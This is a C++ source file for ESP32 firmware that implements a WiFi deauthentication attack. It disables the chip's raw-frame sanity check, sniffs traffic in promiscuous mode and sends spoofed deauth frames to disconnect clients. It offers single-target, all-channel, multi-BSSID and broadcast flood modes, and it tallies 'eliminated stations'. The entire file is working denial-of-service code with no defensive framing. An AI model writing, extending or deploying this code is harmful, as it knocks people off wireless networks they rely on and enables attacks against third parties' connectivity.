#include <WiFi.h>
#include <esp_wifi.h>
#include "types.h"
#include "deauth.h"
#include "definitions.h"

deauth_frame_t deauth_frame;
int deauth_type              = DEAUTH_TYPE_SINGLE;
volatile int      eliminated_stations = 0;
volatile uint32_t deauth_frames_sent  = 0;

// Multi-target flood support
static deauth_frame_t flood_frames[MAX_DEAUTH_TARGETS];
static uint8_t        flood_channels[MAX_DEAUTH_TARGETS];  // per-target channel
static int            flood_target_count = 0;
static int            flood_channel_idx  = 0;   // rotates between targets

extern "C" int ieee80211_raw_frame_sanity_check(int32_t, int32_t, int32_t) { return 0; }
esp_err_t esp_wifi_80211_tx(wifi_interface_t ifx, const void* buffer, int len, bool en_sys_seq);

// ── Promiscuous sniffer ───────────────────────────────────────────────────────
IRAM_ATTR void sniffer(void* buf, wifi_promiscuous_pkt_type_t type) {
    const wifi_promiscuous_pkt_t* raw = (wifi_promiscuous_pkt_t*)buf;
    const wifi_packet_t* pkt = (wifi_packet_t*)raw->payload;
    const mac_hdr_t* hdr = &pkt->hdr;

    if ((int16_t)(raw->rx_ctrl.sig_len - sizeof(mac_hdr_t)) < 0) return;

    if (deauth_type == DEAUTH_TYPE_SINGLE) {
        // Targeted: only hit stations talking to our specific AP
        if (memcmp(hdr->dest, deauth_frame.sender, 6) != 0) return;
        memcpy(deauth_frame.station, hdr->src, 6);
        for (int i = 0; i < NUM_FRAMES_PER_DEAUTH; i++) {
            esp_wifi_80211_tx(WIFI_IF_AP, &deauth_frame, sizeof(deauth_frame), false);
            deauth_frames_sent++;
        }
        eliminated_stations++;

    } else if (deauth_type == DEAUTH_TYPE_ALL) {
        // All-channel: hit any station→AP traffic
        if (memcmp(hdr->dest, hdr->bssid, 6) != 0) return;
        if (memcmp(hdr->dest, "\xFF\xFF\xFF\xFF\xFF\xFF", 6) == 0) return;
        memcpy(deauth_frame.station,      hdr->src,  6);
        memcpy(deauth_frame.access_point, hdr->dest, 6);
        memcpy(deauth_frame.sender,       hdr->dest, 6);
        for (int i = 0; i < NUM_FRAMES_PER_DEAUTH; i++) {
            esp_wifi_80211_tx(WIFI_IF_STA, &deauth_frame, sizeof(deauth_frame), false);
            deauth_frames_sent++;
        }
        eliminated_stations++;
    }
    BLINK_LED(DEAUTH_BLINK_TIMES, DEAUTH_BLINK_DURATION);
}

// ── Single / All ──────────────────────────────────────────────────────────────
void start_deauth(int wifi_number, int attack_type, uint16_t reason) {
    eliminated_stations = 0;
    deauth_frames_sent  = 0;
    deauth_type         = attack_type;
    deauth_frame.reason = reason;

    if (deauth_type == DEAUTH_TYPE_SINGLE) {
        WiFi.mode(WIFI_MODE_AP);
        WiFi.softAP(AP_SSID, AP_PASS, WiFi.channel(wifi_number));
        memcpy(deauth_frame.access_point, WiFi.BSSID(wifi_number), 6);
        memcpy(deauth_frame.sender,       WiFi.BSSID(wifi_number), 6);
    } else {
        // ALL — use STA+AP coexistence so we can still receive button events
        // and the UI keeps running
        WiFi.mode(WIFI_MODE_APSTA);
        WiFi.softAP(AP_SSID, AP_PASS);
    }

    esp_wifi_set_promiscuous(true);
    esp_wifi_set_promiscuous_filter(&filt);
    esp_wifi_set_promiscuous_rx_cb(&sniffer);
}

// Multi-target targeted deauth (same SSID, different BSSIDs)
void start_deauth_multi(int* wifi_numbers, int count, uint16_t reason) {
    // We re-use the single sniffer but prime the frame with the first target.
    // The sniffer will update access_point/sender dynamically from sniffed traffic,
    // so all targets on the same channel get hit automatically.
    // For targets on different channels, we start on channel of first target and
    // rely on the main loop channel-hopping (same as DEAUTH_TYPE_ALL but filtered
    // to the set of BSSIDs we care about).
    eliminated_stations = 0;
    deauth_frames_sent  = 0;
    deauth_type         = DEAUTH_TYPE_SINGLE;  // reuse single logic
    deauth_frame.reason = reason;

    // Store all target BSSIDs for the sniffer to check
    // We repurpose flood_frames array to hold per-target frames
    flood_target_count = min(count, MAX_DEAUTH_TARGETS);
    for (int i = 0; i < flood_target_count; i++) {
        flood_frames[i] = deauth_frame_t{};
        flood_frames[i].reason = reason;
        memcpy(flood_frames[i].access_point, WiFi.BSSID(wifi_numbers[i]), 6);
        memcpy(flood_frames[i].sender,       WiFi.BSSID(wifi_numbers[i]), 6);
    }

    // Prime the main deauth_frame with the first target
    memcpy(deauth_frame.access_point, WiFi.BSSID(wifi_numbers[0]), 6);
    memcpy(deauth_frame.sender,       WiFi.BSSID(wifi_numbers[0]), 6);

    WiFi.mode(WIFI_MODE_APSTA);
    WiFi.softAP(AP_SSID, AP_PASS, WiFi.channel(wifi_numbers[0]));

    esp_wifi_set_promiscuous(true);
    esp_wifi_set_promiscuous_filter(&filt);

    // Custom sniffer that hits any of the target BSSIDs
    esp_wifi_set_promiscuous_rx_cb([](void* buf, wifi_promiscuous_pkt_type_t type) {
        const wifi_promiscuous_pkt_t* raw = (wifi_promiscuous_pkt_t*)buf;
        const wifi_packet_t* pkt  = (wifi_packet_t*)raw->payload;
        const mac_hdr_t*     hdr  = &pkt->hdr;
        if ((int16_t)(raw->rx_ctrl.sig_len - sizeof(mac_hdr_t)) < 0) return;

        for (int i = 0; i < flood_target_count; i++) {
            if (memcmp(hdr->dest, flood_frames[i].sender, 6) == 0) {
                memcpy(flood_frames[i].station, hdr->src, 6);
                for (int j = 0; j < NUM_FRAMES_PER_DEAUTH; j++) {
                    esp_wifi_80211_tx(WIFI_IF_AP, &flood_frames[i], sizeof(deauth_frame_t), false);
                    deauth_frames_sent++;
                }
                eliminated_stations++;
                BLINK_LED(DEAUTH_BLINK_TIMES, DEAUTH_BLINK_DURATION);
                return;
            }
        }
    });
}

void stop_deauth() {
    esp_wifi_set_promiscuous(false);
    deauth_type        = DEAUTH_TYPE_SINGLE;
    flood_target_count = 0;
    DEBUG_PRINTLN("Deauth stopped.");
}

// ── Flood deauth ──────────────────────────────────────────────────────────────
void start_flood_deauth(int wifi_number, uint16_t reason) {
    eliminated_stations = 0;
    deauth_frames_sent  = 0;
    deauth_type         = DEAUTH_TYPE_FLOOD;
    flood_target_count  = 1;

    memset(flood_frames[0].station,      0xFF, 6);
    memcpy(flood_frames[0].access_point, WiFi.BSSID(wifi_number), 6);
    memcpy(flood_frames[0].sender,       WiFi.BSSID(wifi_number), 6);
    flood_frames[0].reason   = reason;
    flood_channels[0]        = (uint8_t)WiFi.channel(wifi_number);

    WiFi.mode(WIFI_MODE_AP);
    WiFi.softAP(AP_SSID, AP_PASS, flood_channels[0]);
    esp_wifi_set_channel(WiFi.channel(wifi_number), WIFI_SECOND_CHAN_NONE);
    esp_wifi_set_promiscuous(false);
    flood_channel_idx = 0;
}

void start_flood_deauth_multi(int* wifi_numbers, int count, uint16_t reason) {
    eliminated_stations = 0;
    deauth_frames_sent  = 0;
    deauth_type         = DEAUTH_TYPE_FLOOD;
    flood_target_count  = min(count, MAX_DEAUTH_TARGETS);
    flood_channel_idx   = 0;

    for (int i = 0; i < flood_target_count; i++) {
        memset(flood_frames[i].station,      0xFF, 6);
        memcpy(flood_frames[i].access_point, WiFi.BSSID(wifi_numbers[i]), 6);
        memcpy(flood_frames[i].sender,       WiFi.BSSID(wifi_numbers[i]), 6);
        flood_frames[i].reason = reason;
        flood_channels[i]      = (uint8_t)WiFi.channel(wifi_numbers[i]);
    }

    WiFi.mode(WIFI_MODE_AP);
    WiFi.softAP(AP_SSID, AP_PASS, flood_channels[0]);
    esp_wifi_set_channel(flood_channels[0], WIFI_SECOND_CHAN_NONE);
    esp_wifi_set_promiscuous(false);
}

// Called every loop() — rotates between targets and fires broadcast deauth
void deauth_flood_loop() {
    if (deauth_type != DEAUTH_TYPE_FLOOD || flood_target_count == 0) return;

    // Rotate target each call so all targets get hit equally
    int t = flood_channel_idx % flood_target_count;
    flood_channel_idx++;

    if (flood_target_count > 1)
        esp_wifi_set_channel(flood_channels[t], WIFI_SECOND_CHAN_NONE);

    for (int i = 0; i < NUM_FRAMES_PER_DEAUTH; i++) {
        esp_wifi_80211_tx(WIFI_IF_AP, &flood_frames[t], sizeof(deauth_frame_t), false);
        eliminated_stations++;
        deauth_frames_sent++;
    }
    BLINK_LED(1, 10);
}
